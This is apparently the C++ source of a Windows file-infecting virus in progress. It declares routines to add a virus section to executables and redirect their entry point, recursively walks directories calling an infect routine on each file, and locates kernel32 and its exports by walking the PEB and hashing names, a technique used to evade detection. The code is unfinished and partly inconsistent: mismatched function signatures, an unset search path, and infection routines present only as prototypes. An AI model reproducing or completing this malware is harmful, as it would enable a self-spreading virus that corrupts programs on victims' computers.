
#include "everything.h"


bool WINAPI VirusIsExistedInFile(const unsigned char *fileName);
void WINAPI AddSection(const unsigned char *fileName, const unsigned char* section_data, DWORD size);

void AdjustEntryPoint();
void ModifyJumpInstructionToVirusCode();

void WINAPI AddVirusToFile(PSTR file_path);

void WINAPI InfectFile(PSTR path);
void WINAPI FindFile(PSTR directory);

inline void ZeroMem(void* data, int size)
{
    for (int i = 0; i < size; i++)
    {
        *((unsigned char*)(data)+i) = 0;
    }
}

void WINAPI FindFile(PSTR directory, PIAT iat)
{
    HANDLE hFind;
    WIN32_FIND_DATAA findData;

    char searchName[1024], fullPath[1024];
    LARGE_INTEGER delay;

    delay.QuadPart = (__int64)-10*10000;
 
    ZeroMem(searchName, sizeof(searchName));
    ZeroMem(&findData, sizeof(WIN32_FIND_DATAA));

    hFind  =  iat->fnFindFirstFileA(searchName, &findData);

    if(hFind != INVALID_HANDLE_VALUE)
    {
        while(iat->fnFindNextFileA(hFind, &findData))
        {
            if(findData.cFileName[0] == '.')
            {
                continue;
            }
             
            ZeroMem(fullPath,sizeof(fullPath));
 
            if(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            {
                FindFile(fullPath);
            }
 
            else
            {
                InfectFile(fullPath);
            }
        }
        iat->fnFindClose(hFind);
    }
}

int main()
{
    
    PPEB p_peb = NtCurrentPeb();

    PVOID base_address = (DWORD_PTR *)p_peb->Reserved3[1]; // (PVOID)(*(DWORD_PTR *)(((DWORD_PTR)p_peb) + 0x10))
    PIMAGE_DOS_HEADER p_image_dos_header_1 = (PIMAGE_DOS_HEADER)base_address;
    WORD magic = p_image_dos_header_1->e_magic;
    cout << hex << magic << endl;

    PLDR_DATA_TABLE_ENTRY ldr = (PLDR_DATA_TABLE_ENTRY)(p_peb->Ldr);
    
    ldr = CONTAINING_RECORD(p_peb->Ldr->InMemoryOrderModuleList.Flink, LDR_DATA_TABLE_ENTRY,InMemoryOrderLinks.Flink); // Read the loader data

    PVOID kernel32_base = nullptr;
    
    while(ldr != 0)
    {
        wchar_t* dll_name = (wchar_t*)(((UNICODE_STRING *)((unsigned long long)(ldr) + sizeof(PVOID) * 11))->Buffer);
        
        if (dll_name == nullptr) break;
        //wcout << dll_name << endl;
        wchar_t c;
        DWORD hash = 0;
        for (int i = 0; i < 13; i++)
        {
            c = dll_name[i];
            if (L'A' <= c && c <= L'Z')
            {
                c = c - L'A' + L'a';
            }
            hash = (hash * 26 + c) % (DWORD)(1e9+7);
        }
        if (hash == 448935215) // hash of L"kernel32.dll"
        {
            kernel32_base = ldr->DllBase; // Store the address of kernel32
            break;
        }

        ldr = CONTAINING_RECORD(ldr->InMemoryOrderLinks.Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    }

    PIMAGE_DOS_HEADER p_image_dos_header = (PIMAGE_DOS_HEADER)kernel32_base;
    PIMAGE_NT_HEADERS p_image_nt_headers = (PIMAGE_NT_HEADERS)((PUCHAR)kernel32_base + p_image_dos_header->e_lfanew);

    // Get the export directory of kernel32
    PIMAGE_EXPORT_DIRECTORY p_image_export_directory;

    p_image_export_directory = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)kernel32_base + p_image_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PULONG function = (PULONG)((PUCHAR)kernel32_base + p_image_export_directory->AddressOfFunctions);

    PULONG name = (PULONG)((PUCHAR)kernel32_base + p_image_export_directory->AddressOfNames);

    PUSHORT ordinal = (PUSHORT)((PUCHAR)kernel32_base + p_image_export_directory->AddressOfNameOrdinals);

    for(int i = 0;i < p_image_export_directory->NumberOfNames; i++)
    {
        PUCHAR ptr = (PUCHAR)kernel32_base + name[i]; // Pointer to function name
        ULONG Hash = 0;
 
        // Compute the hash
 
        while(*ptr)
        {
            Hash = ((Hash<<8) + Hash + *ptr)^(*ptr<<16);
            ptr++;
        }
 
        // Hash of ExpandEnvironmentStringsA
 
        if(Hash == 0x575d1e20)
        {
            //fnExpandEnvironmentStringsA = (pExpandEnvironmentStringsA)((PUCHAR)Kernel32Base + Function[Ordinal[i]]);
        }
    }
}